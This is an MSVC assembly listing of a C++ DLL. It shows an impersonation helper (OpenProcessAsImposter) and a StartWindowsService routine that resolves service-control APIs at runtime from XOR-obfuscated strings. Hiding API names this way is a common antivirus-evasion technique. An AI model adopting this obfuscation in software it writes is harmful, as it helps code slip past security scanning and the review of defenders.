?dtor$0@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA ENDP ; `ProcessUtilities::OpenProcessAsImposter'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$1 = 80
$T2 = 112
$T3 = 120
$T4 = 128
$T5 = 160
$T6 = 192
token$ = 272
dwLogonFlags$dead$ = 280
lpApplicationName$dead$ = 288
lpCommandLine$ = 296
dwCreationFlags$dead$ = 304
lpEnvironment$dead$ = 312
lpCurrentDirectory$dead$ = 320
lpStartupInfo$ = 328
lpProcessInformation$ = 336
?dtor$3@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA PROC ; `ProcessUtilities::OpenProcessAsImposter'::`1'::dtor$3
	mov	rcx, QWORD PTR $T3[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$3@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA ENDP ; `ProcessUtilities::OpenProcessAsImposter'::`1'::dtor$3
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
_TEXT	SEGMENT
$T1 = 48
$T2 = 48
$T3 = 56
$T4 = 64
$T5 = 64
obfuscator$6 = 72
$T7 = 96
$T8 = 128
$T9 = 160
$T10 = 192
$T11 = 224
$T12 = 256
$T13 = 288
$T14 = 320
$T15 = 352
serviceName$GSCopy$ = 384
statusBytesNeeded$ = 392
status$ = 400
__$ArrayPad$ = 440
serviceName$ = 512
?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z PROC ; ProcessUtilities::StartWindowsService, COMDAT

; 244  : DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {

$LN453:
	mov	rax, rsp
	mov	QWORD PTR [rax+16], rbx
	mov	QWORD PTR [rax+24], rsi
	mov	QWORD PTR [rax+32], rdi
	push	rbp
	push	r12
	push	r13
	push	r14
	push	r15
	lea	rbp, QWORD PTR [rax-248]
	sub	rsp, 464				; 000001d0H
	movaps	XMMWORD PTR [rax-56], xmm6
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rbp-256], rax
	mov	rdi, rcx
	mov	QWORD PTR serviceName$GSCopy$[rbp-256], rcx

; 245  : 
; 246  : 	HMODULE advapi = GetLoadedLib(freqDLLS::advapi32);

	lea	rdx, OFFSET FLAT:?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T7[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetLoadedLib
	mov	r12, rax

; 247  : 	PPROCFN::_OpenServiceA         pOpenServiceA = GetFunctionAddress<PPROCFN::_OpenServiceA>(advapi, std::string(HIDE("OpenServiceA")));

	mov	edx, DWORD PTR _tls_index
	mov	rcx, QWORD PTR gs:88
	lea	r15, QWORD PTR [rcx+rdx*8]
	mov	rsi, QWORD PTR [r15]
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51
	mov	ecx, DWORD PTR [rax+rsi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4V67@A
	add	rbx, rsi
	test	cl, 1
	jne	SHORT $LN396@StartWindo
	or	ecx, 1
	mov	DWORD PTR [rax+rsi], ecx
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 21354202		; 0145d6daH
	mov	DWORD PTR [rbx], -103098466		; f9dad79eH
	mov	DWORD PTR [rbx+4], 190033430		; 0b53ae16H
	mov	WORD PTR [rbx+8], 50360			; 0000c4b8H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 247  : 	PPROCFN::_OpenServiceA         pOpenServiceA = GetFunctionAddress<PPROCFN::_OpenServiceA>(advapi, std::string(HIDE("OpenServiceA")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN396@StartWindo:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	mov	r14d, DWORD PTR __isa_available
	movdqa	xmm6, XMMWORD PTR __xmm@00000000000008000000000000000800
	cmp	BYTE PTR [rbx+13], 0
	je	$LN34@StartWindo

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	edx, edx
	cmp	r14d, 5
	jl	$LN442@StartWindo

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm2, XMMWORD PTR __xmm@7d21cb4597bfa7d17d21cb4597bfa7d1
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	edx, 8
$LN442@StartWindo:
	mov	r9, 9016711428731545553			; 7d21cb4597bfa7d1H
	npad	5
$LL438@StartWindo:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, dl
	and	cl, 7
	shl	cl, 3
	mov	r8, r9
	shr	r8, cl
	xor	BYTE PTR [rbx+rdx], r8b

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	rdx
	cmp	rdx, 13
	jb	SHORT $LL438@StartWindo

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+13], 0
$LN34@StartWindo:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 247  : 	PPROCFN::_OpenServiceA         pOpenServiceA = GetFunctionAddress<PPROCFN::_OpenServiceA>(advapi, std::string(HIDE("OpenServiceA")));

	mov	rdx, rbx
	lea	rcx, QWORD PTR $T8[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rbx, rax
	mov	QWORD PTR $T2[rsp], rax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rdx, rax
	lea	rcx, QWORD PTR $T9[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, r12
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	QWORD PTR $T1[rsp], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN62@StartWindo

; 4869 :             _ASAN_STRING_REMOVE(*this);
; 4870 :             auto& _Al = _Getal();
; 4871 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

	mov	rcx, QWORD PTR [rbx]

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN76@StartWindo

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN73@StartWindo

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN76@StartWindo:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN62@StartWindo:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 248  : 	PPROCFN::_OpenSCManagerW       pOpenSCManager = GetFunctionAddress<PPROCFN::_OpenSCManagerW>(advapi, std::string(HIDE("OpenSCManagerW")));

	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rsi]
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN397@StartWindo
	or	eax, 1
	mov	DWORD PTR [rcx+rsi], eax
	lea	rbx, QWORD PTR [rdx+rsi]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+12], 32761373		; 01f3e61dH
	mov	DWORD PTR [rbx], 1666728818		; 63584372H
	mov	DWORD PTR [rbx+4], 1623126588		; 60bef23cH
	mov	DWORD PTR [rbx+8], 1750749779		; 685a5253H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 248  : 	PPROCFN::_OpenSCManagerW       pOpenSCManager = GetFunctionAddress<PPROCFN::_OpenSCManagerW>(advapi, std::string(HIDE("OpenSCManagerW")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	jmp	SHORT $LN85@StartWindo
$LN397@StartWindo:
	lea	rbx, QWORD PTR [rdx+rsi]
$LN85@StartWindo:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+15], 0
	je	$LN96@StartWindo

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	edx, edx
	cmp	r14d, 5
	jl	$LN443@StartWindo

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm2, XMMWORD PTR __xmm@01f3b16f0d3d333d01f3b16f0d3d333d
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm2, xmm0
	pshufb	xmm1, xmm6
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	edx, 8
$LN443@StartWindo:
	mov	r9, 140651103900218173			; 01f3b16f0d3d333dH
	npad	7
$LL439@StartWindo:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, dl
	and	cl, 7
	shl	cl, 3
	mov	r8, r9
	shr	r8, cl
	xor	BYTE PTR [rbx+rdx], r8b

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	rdx
	cmp	rdx, 15
	jb	SHORT $LL439@StartWindo

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+15], 0
$LN96@StartWindo:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 248  : 	PPROCFN::_OpenSCManagerW       pOpenSCManager = GetFunctionAddress<PPROCFN::_OpenSCManagerW>(advapi, std::string(HIDE("OpenSCManagerW")));

	mov	rdx, rbx
	lea	rcx, QWORD PTR $T10[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rbx, rax
	mov	QWORD PTR $T3[rsp], rax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rdx, rax
	lea	rcx, QWORD PTR $T11[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, r12
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	r13, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN124@StartWindo

; 4869 :             _ASAN_STRING_REMOVE(*this);
; 4870 :             auto& _Al = _Getal();
; 4871 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

	mov	rcx, QWORD PTR [rbx]

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN138@StartWindo

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	$LN135@StartWindo

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN138@StartWindo:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN124@StartWindo:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 249  : 	PPROCFN::_QueryServiceStatusEx pQueryServiceStatus = GetFunctionAddress<PPROCFN::_QueryServiceStatusEx>(advapi, std::string(HIDE("QueryServiceStatusEx")));

	movdqa	xmm0, XMMWORD PTR __xmm@23f641f88890a04725f266d29f96bc60
	mov	DWORD PTR obfuscator$6[rsp+16], -1783186876 ; 95b6ba44H
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rsi]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN424@StartWindo
	or	eax, 1
	mov	DWORD PTR [rcx+rsi], eax
	lea	rcx, QWORD PTR [rsi+rbx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rcx+21], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 249  : 	PPROCFN::_QueryServiceStatusEx pQueryServiceStatus = GetFunctionAddress<PPROCFN::_QueryServiceStatusEx>(advapi, std::string(HIDE("QueryServiceStatusEx")));

	lea	rax, QWORD PTR [rcx+20]
	lea	rdx, QWORD PTR obfuscator$6[rsp+20]
	cmp	rcx, rdx
	ja	SHORT $LN334@StartWindo
	lea	rdx, QWORD PTR obfuscator$6[rsp]
	cmp	rax, rdx
	jb	SHORT $LN334@StartWindo
	movups	XMMWORD PTR [rcx], xmm0
	mov	eax, DWORD PTR obfuscator$6[rsp+16]
	mov	DWORD PTR [rcx+16], eax
	mov	BYTE PTR [rcx+20], 171			; 000000abH
	jmp	SHORT $LN410@StartWindo
$LN334@StartWindo:
	movups	XMMWORD PTR [rcx], xmm0
	mov	eax, DWORD PTR obfuscator$6[rsp+16]
	mov	DWORD PTR [rcx+16], eax
	mov	BYTE PTR [rcx+20], 171			; 000000abH
$LN410@StartWindo:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN424@StartWindo:
	lea	r11, QWORD PTR [rsi+rbx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, r11
	call	?decrypt@?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAXXZ ; ay::obfuscated_data<21,6311572415330896177,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 249  : 	PPROCFN::_QueryServiceStatusEx pQueryServiceStatus = GetFunctionAddress<PPROCFN::_QueryServiceStatusEx>(advapi, std::string(HIDE("QueryServiceStatusEx")));

	mov	rdx, r11
	lea	rcx, QWORD PTR $T12[rbp-256]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rbx, rax
	mov	QWORD PTR $T5[rsp], rax
